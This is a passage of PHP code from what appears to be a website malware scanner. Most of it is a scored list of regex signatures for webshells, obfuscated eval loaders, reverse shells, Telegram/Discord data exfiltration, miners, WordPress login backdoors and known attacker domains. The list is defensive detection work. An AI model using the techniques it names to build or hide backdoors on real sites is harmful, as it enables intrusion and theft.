        @ignore_user_abort(true); // keep scanning even if proxy/client disconnects
        header('Content-Type: text/plain; charset=utf-8');
        header('X-Accel-Buffering: no');
        header('Cache-Control: no-cache, no-store');
        if (function_exists('apache_setenv'))
            @apache_setenv('no-gzip', '1');
        @ini_set('output_buffering', 'off');
        @ini_set('zlib.output_compression', 0);
        if (function_exists('ob_implicit_flush'))
            ob_implicit_flush(true);
        while (ob_get_level() > 0)
            @ob_end_flush();

        $streamLine = function ($obj) {
            if (connection_aborted())
                return;
            echo json_encode($obj) . "\n";
            if (function_exists('ob_flush'))
                @ob_flush();
            @flush();
        };

        // ── Reuse ALL scored signatures from scan_files ──
        $scoredSigs = [
            // CRITICAL (score 100)
            ['score' => 100, 'sig' => 'eval_base64', 'pat' => '/eval\s*\(\s*base64_decode/i'],
            ['score' => 100, 'sig' => 'eval_gzinflate', 'pat' => '/eval\s*\(\s*gzinflate/i'],
            ['score' => 100, 'sig' => 'eval_str_rot', 'pat' => '/eval\s*\(\s*str_rot13/i'],
            ['score' => 100, 'sig' => 'remote_eval', 'pat' => '/eval\s*\(\s*@?(file_get_contents|curl_exec|fread)\s*\(/i'],
            ['score' => 100, 'sig' => 'preg_replace_e', 'pat' => '/preg_replace\s*\(\s*[\'"][^\'"]*\/e[\'"]/i'],
            ['score' => 100, 'sig' => 'assert_encoded', 'pat' => '/assert\s*\(\s*(base64_decode|gzinflate|str_rot13)\s*\(/i'],
            ['score' => 100, 'sig' => 'create_fn_encode', 'pat' => '/create_function\s*\([^)]*\s*(base64_decode|gzinflate|strrev)/i'],
            ['score' => 100, 'sig' => 'webshell_rce', 'pat' => '/\b(passthru|system|shell_exec)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i'],
            ['score' => 100, 'sig' => 'assert_rce', 'pat' => '/assert\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i'],
            ['score' => 100, 'sig' => 'phar_exploit', 'pat' => '/(?:include|require|include_once|require_once|file_get_contents|fopen)\s*\(\s*[\'"]?phar:\/\//i'],
            ['score' => 100, 'sig' => 'phar_manifest', 'pat' => '/__HALT_COMPILER\s*\(\s*\)\s*;/'],
            ['score' => 100, 'sig' => 'c2_domain', 'pat' => '/kaye1337|5gvci|qris-pwn|pages\.dev\/stfu/i'],
            ['score' => 100, 'sig' => 'scarlynx', 'pat' => '/scar-?lynx|Scarlynx/i'],
            ['score' => 100, 'sig' => 'c99_shell', 'pat' => '/c99shell|r57shell|b374k|wso\s*shell/i'],
            ['score' => 100, 'sig' => 'phpfilemanager', 'pat' => '/phpFileManager/i'],
            ['score' => 100, 'sig' => 'ravagex', 'pat' => '/ravage-?x|SHADOW\.OPERATOR|HIDDEN_SECTOR/i'],
            ['score' => 100, 'sig' => 'wp_auth_hijack', 'pat' => '/goto\s+\w+;.{0,500}wp_set_auth_cookie/si'],
            ['score' => 100, 'sig' => 'cookie_trigger', 'pat' => '/isset\s*\(\s*\$_COOKIE\[.{0,80}\]\s*\).{0,800}eval\s*\(/si'],
            ['score' => 100, 'sig' => 'tmpfile_loader', 'pat' => '/tmpfile\s*\(\s*\).{0,500}file_get_contents/si'],
            ['score' => 100, 'sig' => 'backdoor_include', 'pat' => '/@include_once\s.*\.config/i'],
            ['score' => 100, 'sig' => 'panox1', 'pat' => '/panox1|backlink-3dp/i'],
            ['score' => 100, 'sig' => 'base85_xor_rot13', 'pat' => '/function\s+_n\s*\(\$s\s*,\s*\$p\s*\).{0,200}function\s+_x\s*\(\$d\s*,\s*\$k\s*\)/si'],
            ['score' => 100, 'sig' => 'rot13_fn_names', 'pat' => '/str_rot13\s*\(\s*[\'"](?:tmhapbzcerff|flf_trg_grzc_qve|grzcanz|svyr_chg_pbagragf|hayvax)[\'"]\s*\)/i'],
            ['score' => 80, 'sig' => 'tempfile_exec', 'pat' => '/(?:tempnam|sys_get_temp_dir)\s*\(.{0,500}(?:include|require)\s/si'],
            ['score' => 100, 'sig' => 'mu_plugin_eval', 'pat' => '/eval\s*\(\s*@?gzuncompress\s*\(\s*base64_decode/i'],
            ['score' => 100, 'sig' => 'ranksat_ioc', 'pat' => '/RanksatAdmin|prabowoasw99|prabowomemek/i'],
            ['score' => 100, 'sig' => 'system_ctx_mgr', 'pat' => '/SystemContextManager|Core\s+Service\s+Protocol\s+Bridge/i'],
            ['score' => 100, 'sig' => 'backtick_rce', 'pat' => '/`\s*\$_(GET|POST|REQUEST|COOKIE)\s*\[/i'],
            ['score' => 100, 'sig' => 'backtick_curly_rce', 'pat' => '/`\s*\{\s*\$_(GET|POST|REQUEST|COOKIE)/i'],
            ['score' => 100, 'sig' => 'include_user_path', 'pat' => '/(?:include|require)(?:_once)?\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)\s*\[/i'],
            ['score' => 100, 'sig' => 'short_tag_eval', 'pat' => '/<\?=\s*eval\s*\(/i'],
            ['score' => 100, 'sig' => 'file_manager_shell', 'pat' => '/FM_PASSWORD_HASH|KanjutDolphin|Tiny\s*File\s*Manager|p0wny.*shell/i'],
            ['score' => 100, 'sig' => 'cve_probe', 'pat' => '/CVE_\d{4}_\d+_BATCH/i'],
            ['score' => 80, 'sig' => 'unauth_uploader', 'pat' => '/move_uploaded_file\s*\(\s*\$_FILES/i'],
            ['score' => 100, 'sig' => 'eval_gzuncompress', 'pat' => '/eval\s*\(\s*gzuncompress/i'],
            ['score' => 50, 'sig' => 'remote_inc_var', 'pat' => '/@include\s+\$\w+|@require\s+\$\w+/i'],
            ['score' => 100, 'sig' => 'wp_remote_eval', 'pat' => '/wp_remote_get\s*\(.{0,300}eval\s*\(/si'],
            ['score' => 100, 'sig' => 'indirect_rce', 'pat' => '/\b(call_user_func|call_user_func_array)\s*\(\s*[\'"](system|exec|passthru|shell_exec|popen|eval|assert)[\'"]/i'],
            ['score' => 90, 'sig' => 'callback_rce', 'pat' => '/\b(array_map|array_filter|array_walk|usort|uasort|uksort|array_reduce)\s*\(\s*[\'"](system|exec|passthru|shell_exec|assert)[\'"]/i'],
            ['score' => 90, 'sig' => 'callback_rce_var', 'pat' => '/\b(call_user_func|array_map|array_filter|array_walk)\s*\(\s*\$\w+\s*,\s*(\$_(GET|POST|REQUEST|COOKIE)|\[)/i'],
            ['score' => 100, 'sig' => 'ob_callback_rce', 'pat' => '/ob_start\s*\(\s*[\'"](system|exec|passthru|shell_exec|assert)[\'"]\s*\)/i'],
            ['score' => 40, 'sig' => 'ob_callback_var', 'pat' => '/ob_start\s*\(\s*\$\w+/i'],
            ['score' => 100, 'sig' => 'shutdown_rce', 'pat' => '/register_shutdown_function\s*\(\s*[\'"](system|exec|passthru|shell_exec|eval|assert)[\'"]/i'],
            ['score' => 100, 'sig' => 'stream_include', 'pat' => '/\b(include|require|include_once|require_once)\s*\(\s*[\'"]?(data|php|expect|zip):\/\//i'],
            ['score' => 90, 'sig' => 'php_input_eval', 'pat' => '/file_get_contents\s*\(\s*[\'"]php:\/\/input[\'"]\s*\).{0,200}eval/si'],
            ['score' => 80, 'sig' => 'extract_inject', 'pat' => '/\bextract\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i'],
            ['score' => 80, 'sig' => 'parse_str_inject', 'pat' => '/\bparse_str\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)/i'],
            ['score' => 100, 'sig' => 'preg_callback_rce', 'pat' => '/preg_replace_callback\s*\(.{0,200}(eval|system|exec|passthru|shell_exec|assert)\s*\(/si'],
            ['score' => 70, 'sig' => 'func_concat', 'pat' => '/\$\w+\s*=\s*[\'"][a-z_]{1,4}[\'"]\s*\.\s*[\'"][a-z_]{1,4}[\'"]\s*\.\s*[\'"][a-z_]{1,6}[\'"].{0,100}eval\s*\(/si'],
            ['score' => 80, 'sig' => 'func_concat_exec', 'pat' => '/\$\w+\s*=\s*[\'"](?:sys|she|pas|exe|ass|ev)[\'"].*?\$\w+\s*\(/si'],
            ['score' => 70, 'sig' => 'password_gate', 'pat' => '/\bmd5\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)\[.{0,50}\]\s*\)\s*[=!]{2,3}\s*[\'"][a-f0-9]{32}[\'"]/i'],
            ['score' => 70, 'sig' => 'password_gate_verify', 'pat' => '/password_verify\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)/i'],
            ['score' => 100, 'sig' => 'kurtlar', 'pat' => '/kurtlar|s4ndal|DrunkShell/i'],
            ['score' => 100, 'sig' => 'msfacai', 'pat' => '/msfacai|KEMBANGTOTO|rocamarc\.com/i'],
            ['score' => 100, 'sig' => 'c2_domains_ext', 'pat' => '/qris-pwn\.pages\.dev|examples2\.pages\.dev|alfaracing\.pages\.dev|forelpe\.xyz/i'],
            ['score' => 80, 'sig' => 'self_delete', 'pat' => '/\$_GET\[.{0,20}\].*@?unlink\s*\(\s*__FILE__\s*\)/si'],
            ['score' => 100, 'sig' => 'zip_spoof', 'pat' => '/include\s*\(\s*[\'"]zip:\/\//i'],
            ['score' => 60, 'sig' => 'custom_decompress', 'pat' => '/function\s+[A-Z][a-z]\s*\(\s*\$\w+\s*\).{0,300}ord\s*\(.{0,100}chr\s*\(/si'],
            ['score' => 70, 'sig' => 'hex_func_array', 'pat' => '/\$\w+\s*=\s*array\s*\(\s*[\'"]\\\\x[0-9a-f]{2}/i'],
            // Plain hex string array dengan inline comment per baris (Gecko pattern)
            ['score' => 80, 'sig' => 'plain_hex_func_array', 'pat' => '/[\'"][0-9a-f]{6,22}[\'"]\s*,\s*#\s*\w/i'],
            // chr(hexdec(...)) decoder — teknik Gecko unx() untuk decode nama fungsi dari hex string
            ['score' => 90, 'sig' => 'chr_hexdec_decode', 'pat' => '/chr\s*\(\s*hexdec\s*\(/i'],
            // Array index callable dengan user input — $fungsi[16]($cmd)
            ['score' => 80, 'sig' => 'array_idx_callable', 'pat' => '/\$\w+\s*\[\s*\d+\s*\]\s*\(\s*(?:[^;)]*\$_(GET|POST|REQUEST|COOKIE|SERVER)|[^;)]*\$\w+\s*[,\)])/i'],
            // $_SERVER key di-hex-escape — Gecko pattern
            ['score' => 70, 'sig' => 'server_hex_key', 'pat' => '/\$_SERVER\s*\[\s*"(?:\\\\x[0-9a-fA-F]{2}){6,}"/i'],
            // Gecko shell IOC
            ['score' => 100, 'sig' => 'gecko_shell', 'pat' => '/MadExploits|gecko-upload|gecko-bc|gecko-select|pwnkit|Privelege-escalation/i'],
            // SEO cloaking management panel — cloak_state.json state file or seofile upload handler
            ['score' => 150, 'sig' => 'seo_cloak_panel', 'pat' => '/cloak_state\.json|\$_FILES\s*\[.{0,30}seofile/si'],
            // Hex-only key auth without md5 — $AUTH='4375d80d263c7d59'; + $_REQUEST check
            ['score' => 90, 'sig' => 'hex_key_auth', 'pat' => '/\$\w{2,10}\s*=\s*[\'"][0-9a-f]{12,32}[\'"]\s*;.{0,200}\$_(REQUEST|GET|POST|COOKIE)\s*\[/si'],
            // detect_root() function — signature of SEO cloaking tools that probe WP/Joomla root
            ['score' => 100, 'sig' => 'detect_root_func', 'pat' => '/function\s+detect_root\s*\(\)/i'],
            // Hidden div backlink spam — position off-screen trick, invisible to users but read by bots
            ['score' => 150, 'sig' => 'hidden_div_spam', 'pat' => '/left\s*:\s*-\d{4,}px/i'],
            // register_shutdown_function closure — stealth execution after page render
            ['score' => 40, 'sig' => 'shutdown_injector', 'pat' => '/register_shutdown_function\s*\(\s*function/i'],
            ['score' => 60, 'sig' => 'dynamic_var_func', 'pat' => '/\$\{\s*\$\w+\s*\}\s*\(|\$\$\w+\s*\(/'],
            ['score' => 80, 'sig' => 'url_fetcher_shell', 'pat' => '/function\s+geturlsinfo\s*\(/i'],
            ['score' => 70, 'sig' => 'chr_chain_long', 'pat' => '/(?:chr\s*\(\d+\)\s*\.?\s*){5,}/i'],
            ['score' => 100, 'sig' => 'eval_strrev', 'pat' => '/eval\s*\(\s*strrev\s*\(/i'],
            ['score' => 100, 'sig' => 'eval_rot13_call', 'pat' => '/eval\s*\(\s*str_rot13\s*\(/i'],
            ['score' => 80, 'sig' => 'closure_rce', 'pat' => '/function\s*\(\s*\$\w*\s*\)\s*\{\s*(system|exec|passthru|shell_exec|eval)\s*\(/i'],
            ['score' => 100, 'sig' => 'wp_hide_user', 'pat' => '/pre_user_query.{0,300}query_where/si'],
            ['score' => 100, 'sig' => 'wp_auto_admin', 'pat' => '/wp_create_user.{0,300}set_role.{0,100}administrator/si'],
            // WP auto-login backdoor — wp_set_auth_cookie triggered by GET/POST/REQUEST input
            ['score' => 100, 'sig' => 'wp_auth_cookie_input', 'pat' => '/\$_(GET|POST|REQUEST|COOKIE).{0,800}wp_set_auth_cookie/si'],
            ['score' => 100, 'sig' => 'wp_auth_cookie_hook', 'pat' => '/add_action\s*\(.{0,80}(init|wp_loaded|plugins_loaded|template_redirect).{0,800}wp_set_auth_cookie/si'],
            ['score' => 100, 'sig' => 'interpolation_rce', 'pat' => '/"\$\{.{0,30}(system|exec|passthru|shell_exec|eval)\s*\(/i'],
            ['score' => 100, 'sig' => 'error_handler_rce', 'pat' => '/set_error_handler\s*\(\s*[\'"](system|exec|passthru|shell_exec|eval)[\'"]/i'],
            ['score' => 100, 'sig' => 'reflection_rce', 'pat' => '/ReflectionFunction\s*\(\s*[\'"](system|exec|passthru|shell_exec|eval)[\'"]/i'],
            ['score' => 100, 'sig' => 'ffi_rce', 'pat' => '/FFI\s*::\s*cdef\s*\(/i'],
            ['score' => 80, 'sig' => 'mail_log_inject', 'pat' => '/\bmail\s*\(.{0,200}-X\s/si'],
            ['score' => 90, 'sig' => 'pcntl_exec', 'pat' => '/\bpcntl_exec\s*\(\s*[\'"\\/]/i'],
            ['score' => 80, 'sig' => 'dl_load', 'pat' => '/(?<![_a-z])dl\s*\(\s*[\'"]/i'],
            ['score' => 70, 'sig' => 'php_filter', 'pat' => '/php:\/\/filter\/.*convert\.(base64|iconv)/i'],
            ['score' => 70, 'sig' => 'file_write_php', 'pat' => '/file_put_contents\s*\(\s*\$_(GET|POST|REQUEST|COOKIE).{0,100}\.php/si'],
            ['score' => 80, 'sig' => 'file_write_eval', 'pat' => '/file_put_contents\s*\(.{0,200}<\?php/si'],
            ['score' => 80, 'sig' => 'ini_error_log', 'pat' => '/ini_set\s*\(\s*[\'"]error_log[\'"]\s*,.{0,100}\.php/i'],
            ['score' => 70, 'sig' => 'unserialize_input', 'pat' => '/\bunserialize\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i'],
            ['score' => 60, 'sig' => 'char_array_build', 'pat' => '/\$\w+\s*=\s*array\s*\(\s*[\'"][a-z][\'"]\s*,\s*[\'"][a-z][\'"]\s*,\s*[\'"][a-z][\'"]\s*,\s*[\'"][a-z][\'"]\s*,\s*[\'"][a-z][\'"]\s*,\s*[\'"][a-z][\'"].*implode/si'],
            ['score' => 50, 'sig' => 'long_hex_string', 'pat' => '/[\'"](?:\\\\x[0-9a-fA-F]{2}){20,}[\'"]/'],
            ['score' => 70, 'sig' => 'compact_extract', 'pat' => '/extract\s*\(\s*compact\s*\(/i'],
            ['score' => 70, 'sig' => 'session_shell', 'pat' => '/\$_SESSION\s*\[.{0,50}\]\s*=.{0,200}eval\s*\(\s*\$_SESSION/si'],
            ['score' => 100, 'sig' => 'ioc_c2_new', 'pat' => '/alfashell|indoxploit|FilesMan|Bypass[_ ]?Shell|Mini[_ ]?Shell|WSO[_ ]?\d/i'],
            ['score' => 100, 'sig' => 'ioc_webshell_brand', 'pat' => '/Leaf[_ ]?Shell|Sadrazam|Ghost[_ ]?Shell|Marijuana[_ ]?Shell|AnonGhost|Mr\.?Nobody/i'],
            ['score' => 70, 'sig' => 'short_param_rce', 'pat' => '/\$_(GET|POST|REQUEST)\s*\[\s*[\'"][a-z0-9]{1,2}[\'"]\s*\].{0,50}(eval|system|exec|passthru|shell_exec)\s*\(/si'],
            ['score' => 70, 'sig' => 'short_param_rce2', 'pat' => '/(eval|system|exec|passthru|shell_exec)\s*\(\s*\$_(GET|POST|REQUEST)\s*\[\s*[\'"][a-z0-9]{1,2}[\'"]\s*\]/i'],
            ['score' => 50, 'sig' => 'underscore_vars', 'pat' => '/\$_{2,5}\s*[\[=\(]/'],
            ['score' => 50, 'sig' => 'b64_var_eval', 'pat' => '/\$\w+\s*=\s*[\'"][A-Za-z0-9+\/]{100,}={0,2}[\'"]/'],
            // HIGH (score 60)
            ['score' => 60, 'sig' => 'chained_encode', 'pat' => '/(gzinflate|gzdeflate|str_rot13|base64_decode).{0,40}(gzinflate|gzdeflate|str_rot13|base64_decode)/i'],
            ['score' => 60, 'sig' => 'eval_hex', 'pat' => '/eval\s*\([^;]{0,80}\\\\x[0-9a-fA-F]{2}/i'],
            ['score' => 60, 'sig' => 'goto_eval', 'pat' => '/goto\s+\w+;.{0,300}eval\s*\(/si'],
            ['score' => 80, 'sig' => 'goto_multi', 'pat' => '/(?:goto\s+\w+\s*;.*?){4,}/si'],
            ['score' => 70, 'sig' => 'mixed_hex_oct', 'pat' => '/\\\\x[0-9a-fA-F]{2}\\\\[0-9]{2,3}|\\\\[0-9]{2,3}\\\\x[0-9a-fA-F]{2}/'],
            ['score' => 80, 'sig' => 'curl_eval_chain', 'pat' => '/curl_exec\s*\(.{0,800}eval\s*\(/si'],
            ['score' => 80, 'sig' => 'eval_concat_rce', 'pat' => '/eval\s*\(\s*[\'"][?<\/]{0,3}[\'"\s]*\.\s*\$\w+/i'],
            ['score' => 60, 'sig' => 'chr_obfusc', 'pat' => '/chr\s*\(\d+\)\s*\.\s*chr\s*\(\d+\)\s*\.\s*chr\s*\(\d+\)/i'],
            ['score' => 60, 'sig' => 'globals_obfusc', 'pat' => '/\$\{[\'"]GLOBALS[\'"]\}\s*\[/i'],
            ['score' => 60, 'sig' => 'var_func_split', 'pat' => '/\$\w+\s*=\s*[\'"]ev[\'"][^;]{0,30}[\'"]al[\'"]/i'],
            // MEDIUM
            ['score' => 40, 'sig' => 'has_eval', 'pat' => '/\beval\s*\(/i'],
            ['score' => 40, 'sig' => 'has_base64', 'pat' => '/\bbase64_decode\s*\(/i'],
            ['score' => 40, 'sig' => 'has_gzip', 'pat' => '/\bgzinflate\s*\(|\bgzdeflate\s*\(/i'],
            ['score' => 30, 'sig' => 'has_system_fn', 'pat' => '/\b(system|passthru|shell_exec|exec|popen)\s*\(/i'],
            ['score' => 30, 'sig' => 'has_cookie_input', 'pat' => '/\$_(GET|POST|REQUEST|COOKIE)\s*\[/i'],
            ['score' => 20, 'sig' => 'has_str_obfusc', 'pat' => '/\bstr_rot13\s*\(|\bstrrev\s*\(/i'],
            ['score' => 20, 'sig' => 'has_phar', 'pat' => '/\bPhar\b|\bphar\b/i'],
            ['score' => 20, 'sig' => 'has_goto', 'pat' => '/\bgoto\s+\w+/i'],
            // ── NEW PATTERNS — tambahan deteksi yang sering terlewat ──
            // Webshell encoded via hex2bin
            ['score' => 100, 'sig' => 'eval_hex2bin', 'pat' => '/eval\s*\(\s*hex2bin\s*\(/i'],
            // proc_open with user input — reverse shell builder
            ['score' => 90, 'sig' => 'proc_open_rce', 'pat' => '/proc_open\s*\(.{0,200}\$_(GET|POST|REQUEST|COOKIE)/si'],
            // Socket-based reverse shell
            ['score' => 100, 'sig' => 'socket_shell', 'pat' => '/fsockopen\s*\(.{0,200}(fwrite|fputs).{0,200}\$_(GET|POST|REQUEST|COOKIE)/si'],
            ['score' => 100, 'sig' => 'socket_revshell', 'pat' => '/\bfsockopen\s*\(.{0,500}(shell_exec|passthru|system|exec|popen)\s*\(/si'],
            // Obfuscated function via variable variable — $$a($$b)
            ['score' => 70, 'sig' => 'varvar_exec', 'pat' => '/\$\$\w+\s*\(\s*\$\$\w+/'],
            // WordPress options injection (wp_options backdoor)
            ['score' => 100, 'sig' => 'wp_option_backdoor', 'pat' => '/update_option\s*\(.{0,100}(eval|base64_decode|system|exec)/si'],
            // Suspicious .ico/.jpg/.png.php files (reverse double extension)
            ['score' => 90, 'sig' => 'double_ext_reverse', 'pat' => '/\.(ico|jpg|jpeg|png|gif|bmp|svg)\.php$/i'],
            // Base64 decode + gzinflate combo in single expression
            ['score' => 100, 'sig' => 'b64_gz_combo', 'pat' => '/base64_decode\s*\(\s*[\'"][A-Za-z0-9+\/]{50,}.*gzinflate/si'],
            // Disable error reporting + eval = classic shell opener
            ['score' => 80, 'sig' => 'error_off_eval', 'pat' => '/error_reporting\s*\(\s*0\s*\).{0,500}eval\s*\(/si'],
            // Suspicious long single-line PHP (>5000 chars, single line = obfuscated)
            ['score' => 60, 'sig' => 'single_line_obfusc', 'pat' => '/^<\?php\s+\S{5000,}/s'],
            // WordPress wp-config.php injection — adding code before/after wp-settings
            ['score' => 90, 'sig' => 'wpconfig_inject', 'pat' => '/require_once\s*\(\s*ABSPATH\s*\.\s*[\'"]wp-settings\.php[\'"]\s*\).{1,500}(eval|base64_decode|system|include)/si'],
            // Curl to external domain + write to file
            ['score' => 80, 'sig' => 'curl_drop_shell', 'pat' => '/curl_exec\s*\(.{0,500}file_put_contents/si'],
            // WordPress add_action/add_filter with inline eval
            ['score' => 100, 'sig' => 'wp_hook_eval', 'pat' => '/add_(action|filter)\s*\(.{0,200}eval\s*\(\s*(base64_decode|gzinflate|str_rot13)/si'],
            // Hex string decode + eval
            ['score' => 90, 'sig' => 'hex_decode_eval', 'pat' => '/hex2bin\s*\(.{0,200}eval/si'],
            // Suspicious .htaccess manipulation via PHP
            ['score' => 80, 'sig' => 'htaccess_write', 'pat' => '/file_put_contents\s*\(.{0,100}\.htaccess/si'],
            // Obfuscated string building via array_merge + implode + chr
            ['score' => 70, 'sig' => 'array_chr_build', 'pat' => '/array_map\s*\(\s*[\'"]chr[\'"]\s*,.{0,200}(eval|assert)/si'],
            // GIF89a header trick (PHP webshell disguised as image)
            ['score' => 90, 'sig' => 'gif_header_shell', 'pat' => '/^GIF89a.{0,50}<\?php/si'],
            // JFIF/EXIF header trick
            ['score' => 90, 'sig' => 'exif_header_shell', 'pat' => '/^\xFF\xD8\xFF.{0,100}<\?php/si'],
            // Null byte injection
            ['score' => 100, 'sig' => 'null_byte', 'pat' => '/\x00.{0,50}<\?php/s'],
            // ── Synced from scan_files ──
            ['score' => 100, 'sig' => 'include_nonphp_file', 'pat' => '/(?:include|require)(?:_once)?\s*[\(\s]*[\'"][^\'"\/\\\\]+\.(?!php[3-8]?[\'"\s]|phtml[\'"\s]|html?[\'"\s]|inc[\'"\s])[a-z0-9_-]{1,20}[\'"]/i'],
            ['score' => 100, 'sig' => 'include_userinput', 'pat' => '/(?:include|require)(?:_once)?\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|FILES)\s*\[/i'],
            ['score' => 100, 'sig' => 'stream_wrapper_loader', 'pat' => '/(?:include|require|file_get_contents|fopen)\s*\(\s*[\'"](?:zip|phar|glob|data):\/\//i'],
            ['score' => 80, 'sig' => 'include_fetched_var', 'pat' => '/(?:move_uploaded_file|file_put_contents|copy).{0,300}(?:include|require)\s*\(\s*\$/si'],
            ['score' => 90, 'sig' => 'hex_eval_bypass', 'pat' => '/eval\s*\(\s*"\\\\x[0-9a-f]{2}(?:\\\\x[0-9a-f]{2}){3,}"/i'],
            ['score' => 70, 'sig' => 'varvar_call', 'pat' => '/\$\$\w+\s*\(|\$\{\s*\$\w+\s*\}\s*\(/'],
            ['score' => 80, 'sig' => 'oop_backdoor', 'pat' => '/function\s+__construct\s*\([^)]*\).{0,300}(eval|system|exec|passthru|shell_exec)\s*\(/si'],
            ['score' => 80, 'sig' => 'destruct_rce', 'pat' => '/function\s+__destruct\s*\(\s*\).{0,500}(eval|system|exec|passthru|shell_exec|file_put_contents)\s*\(/si'],
            ['score' => 80, 'sig' => 'wakeup_rce', 'pat' => '/function\s+__wakeup\s*\(\s*\).{0,500}(eval|system|exec|passthru|shell_exec)\s*\(/si'],
            ['score' => 60, 'sig' => 'header_redirect_inject', 'pat' => '/header\s*\(\s*[\'"]Location:\s*[\'"]\s*\.\s*\$_(GET|POST|REQUEST)/i'],
            ['score' => 90, 'sig' => 'wp_option_inject', 'pat' => '/update_option\s*\(.{0,100}base64_decode/si'],
            ['score' => 100, 'sig' => 'reverse_shell', 'pat' => '/fsockopen\s*\(.{0,300}(exec|system|passthru|shell_exec|popen)\s*\(/si'],
            ['score' => 90, 'sig' => 'socket_backdoor', 'pat' => '/socket_create\s*\(.{0,500}socket_connect/si'],
            ['score' => 90, 'sig' => 'proc_open_shell', 'pat' => '/proc_open\s*\(\s*[\'"](\/bin\/(ba)?sh|cmd(\.exe)?|powershell)/i'],
            ['score' => 70, 'sig' => 'data_exfil_bot', 'pat' => '/api\.telegram\.org\/bot|discord(app)?\.com\/api\/webhooks/i'],
            ['score' => 100, 'sig' => 'crypto_miner', 'pat' => '/coinhive|cryptonight|stratum\+tcp|xmrig|minergate/i'],
            ['score' => 80, 'sig' => 'double_ext', 'pat' => '/\.php\d?\.(jpg|jpeg|png|gif|ico|css|js|svg|txt|html?)$/i'],
            // ── Char-by-char string concat to build function names ──
            ['score' => 80, 'sig' => 'char_concat_func', 'pat' => '/\$\w+\s*=\s*[\'"][a-z_][\'"]\s*\.\s*[\'"][a-z_][\'"]\s*\.\s*[\'"][a-z_][\'"]\s*\.\s*[\'"][a-z_][\'"]\s*\.\s*[\'"][a-z_][\'"]\s*\.\s*[\'"][a-z_][\'"]/',],
            ['score' => 90, 'sig' => 'var_func_upload', 'pat' => '/\$\w+\s*\(\s*\$_FILES\s*\[/i'],
            ['score' => 80, 'sig' => 'var_func_userinput', 'pat' => '/\$\w+\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)\s*\[/i'],
            ['score' => 100, 'sig' => 'gif_uploader_shell', 'pat' => '/GIF89a.{0,500}<form.{0,300}(move_uploaded_file|\$_FILES|file_put_contents)/si'],
            ['score' => 90, 'sig' => 'seo_spam_shell', 'pat' => '/noindex.{0,200}<form.{0,500}\$_FILES/si'],
            // ── Advanced evasion techniques ──
            ['score' => 90, 'sig' => 'base_convert_func', 'pat' => '/base_convert\s*\(\s*[\'"]?\d{4,}[\'"]?\s*,\s*\d+\s*,\s*36\s*\)/i'],
            ['score' => 80, 'sig' => 'dechex_func_build', 'pat' => '/hex2bin\s*\(\s*[\'"][0-9a-f]{8,}[\'"]\s*\)/i'],
            ['score' => 70, 'sig' => 'array_reverse_func', 'pat' => '/implode\s*\(.{0,20}array_reverse\s*\(/i'],
            ['score' => 70, 'sig' => 'xor_string_build', 'pat' => '/\$\w+\s*=\s*[\'"][^"\']{3,20}[\'"]\s*\^\s*[\'"][^"\']{3,20}[\'"]/'],
            ['score' => 60, 'sig' => 'str_split_build', 'pat' => '/str_split\s*\(.{0,100}(implode|join)\s*\(/si'],
            ['score' => 90, 'sig' => 'header_var_exec', 'pat' => '/\$\$_SERVER\s*\[\s*[\'"]HTTP_/i'],
            ['score' => 80, 'sig' => 'header_func_call', 'pat' => '/\$_SERVER\s*\[\s*[\'"]HTTP_[A-Z_]+[\'"]\s*\]\s*\(/i'],
            ['score' => 80, 'sig' => 'getallheaders_exec', 'pat' => '/getallheaders\s*\(\s*\).{0,200}(eval|system|exec|assert|call_user_func)/si'],
            ['score' => 80, 'sig' => 'pack_func_build', 'pat' => '/pack\s*\(\s*[\'"]H\*[\'"]\s*,.{0,200}(eval|\$\w+\s*\()/si'],
            ['score' => 60, 'sig' => 'substr_func_build', 'pat' => '/\$\w+\s*=\s*substr\s*\(.{0,100}\$\w+\s*\(/si'],
            ['score' => 70, 'sig' => 'str_replace_func', 'pat' => '/str_replace\s*\(\s*[\'"][^"\']{1,3}[\'"]\s*,\s*[\'"]{2}\s*,\s*[\'"][a-z_]{6,30}[\'"]\s*\)/i'],
            ['score' => 70, 'sig' => 'preg_extract_func', 'pat' => '/preg_replace\s*\(.{0,100}[\'"]\s*,\s*[\'"]{2}\s*,\s*[\'"][^"\']{6,}[\'"]\s*\)/i'],
            ['score' => 90, 'sig' => 'unicode_escape', 'pat' => '/\\\\u\{[0-9a-f]{4}\}.*\\\\u\{[0-9a-f]{4}\}.*\\\\u\{[0-9a-f]{4}\}/i'],
            ['score' => 80, 'sig' => 'octal_string_func', 'pat' => '/"(?:\\\\[0-9]{2,3}){5,}"/'],
            ['score' => 70, 'sig' => 'compact_smuggle', 'pat' => '/compact\s*\(.{0,200}extract\s*\(/si'],
            ['score' => 60, 'sig' => 'long_payload_var', 'pat' => '/\$\w+\s*=\s*[\'"][A-Za-z0-9+\/\\\\x]{500,}/s'],
            ['score' => 90, 'sig' => 'tick_func_exec', 'pat' => '/register_tick_function\s*\(\s*[\'"](system|exec|passthru|shell_exec|eval)[\'"]/i'],
            ['score' => 90, 'sig' => 'walk_recursive_rce', 'pat' => '/array_walk_recursive\s*\(.{0,100}[\'"](system|exec|passthru|shell_exec|assert)[\'"]/i'],
            ['score' => 100, 'sig' => 'create_func_input', 'pat' => '/create_function\s*\(.{0,100}\$_(GET|POST|REQUEST|COOKIE)/si'],
            ['score' => 70, 'sig' => 'nested_var_call', 'pat' => '/\$\w+\s*\(\s*\$\w+\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i'],
            ['score' => 70, 'sig' => 'closing_tag_hide', 'pat' => '/\x3f\x3e\s*<\x3f(php)?\s*(eval|system|exec|passthru|shell_exec|base64_decode)\s*\(/si'],
            // ── PHP-based cloaking detection ──
            ['score' => 90, 'sig' => 'php_bot_ua_list', 'pat' => '/googlebot.{0,50}bingbot.{0,50}(yandexbot|baiduspider|slurp|duckduckbot|facebookexternalhit)/si'],
            ['score' => 80, 'sig' => 'ua_bot_check', 'pat' => '/HTTP_USER_AGENT.{0,200}(googlebot|bingbot|yandexbot|spider|crawl)/si'],
